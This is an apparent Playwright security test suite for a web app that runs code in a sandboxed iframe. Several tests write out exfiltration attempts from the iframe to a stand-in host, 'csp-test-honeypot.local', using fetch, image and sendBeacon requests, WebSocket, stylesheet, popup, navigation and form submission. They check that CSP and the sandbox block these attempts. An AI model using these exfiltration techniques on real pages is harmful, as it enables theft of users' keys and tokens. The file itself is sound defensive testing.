import { test, expect, type Page } from '@playwright/test';

const HONEYPOT = 'https://csp-test-honeypot.local';
// Allowed origin — same server the app runs on
const ALLOWED = 'http://localhost:5173';

test.describe('App-level iframe and LLM security', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('http://localhost:5173');
    await page.evaluate(() => {
      localStorage.setItem('codevinci-llm-enabled', 'true');
      localStorage.setItem('codevinci-llm-config', JSON.stringify({
        provider: 'openai-compatible',
        apiEndpoint: 'http://localhost:11434/v1',
        apiKey: 'sk-test-secret-key-12345',
        defaultModel: 'gpt-4o',
        systemPrompt: 'You are a test assistant.',
        availableModels: ['gpt-4o'],
        connectionValid: true,
        temperature: 0.7,
        topP: 0.95,
        maxTokens: 4096,
        cspOrigin: 'http://localhost:11434',
      }));
    });
    await page.reload();
  });

  test('viewer iframe has sandbox="allow-scripts" without allow-same-origin', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(1000);

    const sandbox = await page.locator('iframe[sandbox="allow-scripts"]').getAttribute('sandbox');
    expect(sandbox).toBe('allow-scripts');

    const fullSandbox = await page.locator('iframe').first().getAttribute('sandbox');
    expect(fullSandbox?.split(' ')).not.toContain('allow-same-origin');
  });

  test('attack: iframe cannot steal token via localStorage read', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        (parent as Window).localStorage.getItem('codevinci-llm-config');
        return { blocked: false as const };
      } catch {
        return { blocked: true as const };
      }
    });
    expect(result.blocked).toBe(true);
  });

  test('attack: iframe cannot steal token via parent DOM query', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        (parent as Window).document.querySelector('input')?.value;
        return { blocked: false as const };
      } catch {
        return { blocked: true as const };
      }
    });
    expect(result.blocked).toBe(true);
  });

  test.describe('CSP exfiltration prevention', () => {
    test.beforeEach(async ({ page }) => {
      await setupAndAcceptDisclaimer(page);
      await page.selectOption('select', 'view-edit');
      await navigateToFrame(page);
    });

    test('iframe can send requests to allowed origin (honeypot works)', async ({ page }) => {
      const token = crypto.randomUUID();
      let captured: string | undefined;

      await page.route(ALLOWED + '/honeypot-verify*', (route) => {
        const url = new URL(route.request().url());
        captured = url.searchParams.get('token') ?? undefined;
        route.abort();
      });

      await frame(page).evaluate(async ({ url, t }) => {
        try { await fetch(url + '/honeypot-verify?token=' + t); } catch { /* abort expected */ }
      }, { url: ALLOWED, t: token });

      await page.waitForTimeout(500);
      expect(captured).toBe(token);
    });

    test('CSP blocks fetch exfiltration to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/steal*', () => { caught = true; });

      const token = crypto.randomUUID();
      await frame(page).evaluate(async ({ url, t }) => {
        try { await fetch(url + '/steal?key=' + t); } catch { /* CSP blocks this */ }
      }, { url: HONEYPOT, t: token });

      await page.waitForTimeout(500);
      expect(caught).toBe(false);
    });

    test('CSP blocks image beacon exfiltration', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/beacon*', () => { caught = true; });

      await frame(page).evaluate(async (url) => {
        return new Promise<void>((resolve) => {
          const img = new Image();
          img.onload = () => resolve();
          img.onerror = () => resolve();
          img.src = url + '/beacon?key=test';
          setTimeout(resolve, 2000);
        });
      }, HONEYPOT);

      expect(caught).toBe(false);
    });

    test('CSP blocks sendBeacon exfiltration', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/sendBeacon*', () => { caught = true; });

      await frame(page).evaluate((url) => {
        navigator.sendBeacon(url + '/sendBeacon', 'key=test');
      }, HONEYPOT);
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });

    test('CSP blocks WebSocket exfiltration', async ({ page }) => {
      let caught = false;
      await page.route('wss://csp-test-honeypot.local/*', () => { caught = true; });

      await frame(page).evaluate(async () => {
        return new Promise<void>((resolve) => {
          try {
            const ws = new WebSocket('wss://csp-test-honeypot.local/steal');
            ws.onopen = () => resolve();
            ws.onerror = () => resolve();
          } catch { resolve(); }
          setTimeout(resolve, 2000);
        });
      });

      expect(caught).toBe(false);
    });

    test('CSP blocks stylesheet beacon exfiltration', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/css*', () => { caught = true; });

      await frame(page).evaluate(async (url) => {
        return new Promise<void>((resolve) => {
          const link = document.createElement('link');
          link.rel = 'stylesheet';
          link.href = url + '/css?key=test';
          link.onload = () => resolve();
          link.onerror = () => resolve();
          document.head.appendChild(link);
          setTimeout(resolve, 2000);
        });
      }, HONEYPOT);

      expect(caught).toBe(false);
    });

    test('sandbox blocks window.open popup exfiltration', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/popup*', () => { caught = true; });

      await frame(page).evaluate((url) => {
        try { window.open(url + '/popup?key=test'); } catch { /* sandbox blocks */ }
      }, HONEYPOT);
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });

    test('sandbox blocks top navigation exfiltration', async ({ page }) => {
      await frame(page).evaluate((url) => {
        try { (parent as Window).location.href = url + '/steal?key=test'; } catch { /* sandbox blocks */ }
      }, HONEYPOT);
    });

    test('CSP form-action blocks form submission exfiltration', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/form*', () => { caught = true; });

      await frame(page).evaluate((url) => {
        const form = document.createElement('form');
        form.method = 'GET';
        form.action = url + '/form';
        const input = document.createElement('input');
        input.name = 'key';
        input.value = 'test';
        form.appendChild(input);
        document.body.appendChild(form);
        try { form.submit(); } catch { /* CSP blocks */ }
      }, HONEYPOT);
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });
  });

  test('CSP meta tag includes all required directives', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    const csp = await page.evaluate(() =>
      document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')
    );
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).not.toContain("'unsafe-eval'");
  });
});

function frame(page: Page) {
  const f = page.frames().find(f => f.url() === 'about:srcdoc');
  if (!f) throw new Error('iframe frame not found');
  return f;
}

async function navigateToFrame(page: Page) {
  await page.waitForSelector('iframe[sandbox="allow-scripts"]', { timeout: 5000 });
  await page.waitForTimeout(1500);
  expect(frame(page)).toBeDefined();
}

async function setupAndAcceptDisclaimer(page: Page) {
  await page.getByRole('button', { name: 'Run code' }).click();
  await page.waitForTimeout(500);
}
